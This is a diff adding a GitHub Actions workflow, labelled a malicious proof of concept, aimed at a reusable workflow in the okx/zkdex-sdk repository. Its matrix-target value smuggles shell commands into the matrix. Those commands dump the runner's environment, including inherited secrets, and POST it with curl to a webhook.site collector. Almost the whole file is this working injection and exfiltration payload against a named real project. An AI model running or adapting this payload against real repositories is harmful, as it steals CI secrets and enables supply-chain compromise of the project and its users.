@@ -1,0 +1,15 @@
+name: Malicious Proof of Concept
+
+on:
+  workflow_dispatch:
+
+jobs:
+  trigger-exploit:
+    uses: okx/zkdex-sdk/.github/workflows/python-sdk.yml@main
+    # The 'uses' keyword calls the vulnerable workflow.
+    # The 'with' payload is passed to it and, if the matrix is built from untrusted input, can be injected.
+    with:
+      # This payload is designed to be interpolated into the matrix strategy.
+      # In a real attack, this would be triggered via a pull_request event.
+      matrix-target: 'x86_64"; echo "VULNERABLE: Matrix Injection"; env | curl -X POST --data-binary @- "	https://webhook.site/86e8b412-7191-449c-9b7e-071bad00d67e"; echo "'
+    secrets: inherit
